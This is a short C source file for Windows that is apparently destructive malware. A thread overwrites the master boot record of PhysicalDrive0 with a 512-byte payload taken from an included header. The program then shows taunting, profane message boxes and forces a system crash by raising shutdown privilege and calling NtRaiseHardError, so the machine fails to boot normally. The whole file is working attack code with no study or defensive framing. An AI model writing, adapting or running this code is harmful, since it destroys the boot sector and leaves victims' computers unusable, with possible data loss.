#include <windows.h>
#include "boot.h"

typedef NTSTATUS(WINAPI* RtlAdjustPrivilege_t)(ULONG Privilege, BOOL Enable, BOOL CurrentThread, PBOOLEAN Enabled);
typedef NTSTATUS(WINAPI* NtRaiseHardError_t)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

DWORD WINAPI RepMBR(LPVOID lpParam) {
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0",
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    DWORD dwBytesWritten = 0;
    BOOL result = WriteFile(hDevice, boot, 512UL, &dwBytesWritten, NULL);
    CloseHandle(hDevice);
    return 0;
}

DWORD WINAPI MessageBoxThread(LPVOID lpParam) {
    MessageBoxW(NULL, L"FUCK U", L"u werent aware", MB_YESNO | MB_ICONEXCLAMATION);
    return 0;
}


int main() {
    CreateThread(0, 0, RepMBR, 0, 0, 0);
    MessageBoxW(NULL, L"! wtf", L"u werent aware", MB_YESNO | MB_ICONEXCLAMATION);
    MessageBoxW(NULL, L"motherfucker why did u recover the mbr", L"u werent aware???!", MB_YESNO | MB_ICONEXCLAMATION);
    MessageBoxW(NULL, L"u also werent so smart", L"u werent aware", MB_YESNO | MB_ICONEXCLAMATION);
    CreateThread(0, 0, MessageBoxThread, 0, 0, 0);
    Sleep(1000);

    BOOLEAN Bool;
    DWORD Res;
    NRHEdef NtRaiseHardError_t = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
    RAPdef RtlAdjustPrivilege_t = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
    RtlAdjustPrivilege_t(19, 1, 0, &Bool);
    NtRaiseHardError_t(0xC0000145, 0, 0, 0, 6, &Res);
    return 1;
}